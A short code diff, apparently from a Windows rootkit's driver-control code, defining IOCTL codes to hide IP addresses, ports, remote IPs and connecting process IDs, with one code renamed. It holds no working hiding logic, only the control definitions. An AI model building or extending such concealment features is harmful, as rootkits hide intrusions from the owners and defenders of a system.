@@ -29,7 +29,7 @@ namespace Driver
 		HideIP = CTL_CODE(RootkitDeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS),
 		HidePort = CTL_CODE(RootkitDeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS),
 		HideRemoteIP = CTL_CODE(RootkitDeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS),
-		HideTCPProcessId = CTL_CODE(RootkitDeviceType, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
+		HideConnectProcessId = CTL_CODE(RootkitDeviceType, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
 	};
 
 	class DriverHandler
